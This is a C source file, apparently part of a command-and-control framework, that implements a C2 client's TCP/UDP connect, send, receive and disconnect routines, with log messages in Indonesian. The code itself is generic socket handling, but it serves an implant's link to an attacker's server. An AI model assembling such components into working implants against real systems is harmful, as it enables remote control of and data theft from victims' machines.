#include "../include/core/c2_client.h"
#include "../include/utils/logger.h"
#include "../include/utils/crypto_utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>

#define BUFFER_SIZE 4096

int c2_connect(const char *host, int port, int use_udp) {
    int sock = -1;
    struct sockaddr_in serv_addr;
    
    if (use_udp) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
    } else {
        sock = socket(AF_INET, SOCK_STREAM, 0);
    }
    
    if (sock < 0) {
        log_error("C2 Client: Gagal membuat socket: %s", strerror(errno));
        return -1;
    }
    
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host);
        if (he == NULL) {
            log_error("C2 Client: Host tidak valid atau gagal resolve: %s", host);
            close(sock);
            return -1;
        }
        memcpy(&serv_addr.sin_addr, he->h_addr_list[0], he->h_length);
    }
    
    if (!use_udp) {
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            log_error("C2 Client: Gagal terhubung ke C2 server TCP %s:%d - %s", host, port, strerror(errno));
            close(sock);
            return -1;
        }
        log_info("C2 Client: Berhasil terhubung ke TCP C2 Server di %s:%d", host, port);
    } else {
        // Untuk UDP, koneksi secara logis di-set via connect() agar bisa menggunakan send/recv
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            log_error("C2 Client: Gagal setup UDP target %s:%d - %s", host, port, strerror(errno));
            close(sock);
            return -1;
        }
        log_info("C2 Client: UDP target diset ke %s:%d", host, port);
    }
    
    return sock;
}

int c2_send_data(int sock, const unsigned char *data, size_t length) {
    if (sock < 0 || data == NULL || length == 0) {
        return -1;
    }
    
    ssize_t sent = send(sock, data, length, 0);
    if (sent < 0) {
        log_error("C2 Client: Gagal mengirim data: %s", strerror(errno));
        return -1;
    }
    
    return (int)sent;
}

int c2_receive_data(int sock, unsigned char *buffer, size_t max_length) {
    if (sock < 0 || buffer == NULL || max_length == 0) {
        return -1;
    }
    
    ssize_t received = recv(sock, buffer, max_length, 0);
    if (received < 0) {
        log_error("C2 Client: Gagal menerima data: %s", strerror(errno));
        return -1;
    } else if (received == 0) {
        log_warn("C2 Client: Koneksi ditutup oleh C2 Server.");
        return 0;
    }
    
    return (int)received;
}

void c2_disconnect(int sock) {
    if (sock >= 0) {
        close(sock);
        log_info("C2 Client: Socket terputus dan ditutup.");
    }
}
